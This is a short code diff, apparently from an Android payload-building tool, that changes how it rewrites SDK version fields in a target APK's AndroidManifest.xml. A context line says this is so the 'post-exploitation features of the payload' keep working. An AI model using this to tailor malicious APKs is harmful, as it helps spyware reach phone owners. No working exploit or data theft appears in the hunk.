@@ -19,10 +19,15 @@ in order for the post-exoloitation features of the payload to work after after i
                                 
                                 $appCtrl.Log("Modifying the Target SDK Version...");
                                 $appCtrl.Log();
-                                var sdkRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
-                                var VerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
-                                var repSdk = data.replace(sdkRegex, "$122"+'"').replace(VerCoRegex, "$122"+'"');
-                                fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repSdk, 'utf8', (error) => {
+
+                                var sdkVerCoRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
+                                var verNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/;
+
+                                var compSdkRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
+                                var verCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
+				
+                                var repXmlSdk = data.replace(compSdkRegex, "$122"+'"').replace(verCoRegex, "$122"+'"').replace(sdkVerCoRegex, "$111"+'"').replace(verNameRegex, "$111"+'"');
+                                fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                   if (error) {
                                       $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
                                       $appCtrl.Log();          
